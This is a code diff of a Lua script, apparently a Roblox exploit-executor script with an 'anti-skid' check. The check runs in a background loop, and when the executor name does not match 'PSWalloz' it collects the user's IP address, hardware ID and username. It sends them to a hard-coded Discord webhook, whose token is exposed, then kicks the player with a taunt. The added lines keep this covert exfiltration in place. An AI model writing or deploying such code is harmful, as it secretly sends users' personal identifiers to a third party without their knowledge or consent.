@@ -389,7 +389,7 @@ task.spawn(function()
     while true do
         wait(5)
         if identifyexecutor() ~= "PSWalloz" or getexecutorname() ~= "PSWalloz" then
-            local kakav3 = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..disocrdip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
+            local kakav3 = "@PSWalloz \nidentifyexecutor -> "..identifyexecutor().."\ngetexecutorname -> "..getexecutorname().."\nIp -> "..disocrdip().."\nHwid -> "..gethwid().."\nUsername -> "..game.Players.LocalPlayer.Name
             local kaka = {
                 Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
                 Body = HttpService:JSONEncode({
@@ -402,7 +402,8 @@ task.spawn(function()
                 }
             }
             sendRequest(kaka, timeout)
-            game.Players.LocalPlayer:Kick("Unauthorized executor detected.")
+            game.Players.LocalPlayer:Kick("stop skidding lil bro")
+            error("skidder alert")
         end
     end
 end)
